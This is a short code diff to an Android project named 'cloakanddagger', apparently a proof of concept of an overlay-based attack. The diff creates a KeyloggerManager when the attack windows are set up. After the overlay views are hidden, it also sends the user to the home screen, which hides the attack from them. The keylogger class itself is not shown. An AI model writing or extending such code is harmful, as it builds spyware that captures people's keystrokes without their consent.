@@ -2,6 +2,7 @@ package andrews.cloakanddagger;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.graphics.Point;
 import android.view.Display;
@@ -40,6 +41,8 @@ public class WindowSetup {
         display.getSize(size);
         width = size.x;
         height = size.y;
+
+        KeyloggerManager keyloggerManager = new KeyloggerManager(context, manager, width, height);
     }
 
 
@@ -129,6 +132,11 @@ public class WindowSetup {
                     /**startPhase3(parent);*/
                     overlaying_view1.setVisibility(View.GONE);
                     touch_view.setVisibility(View.GONE);
+
+                    Intent startMain = new Intent(Intent.ACTION_MAIN);
+                    startMain.addCategory(Intent.CATEGORY_HOME);
+                    startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    parent.startActivity(startMain);
                     return true;
                 }
                 return false;
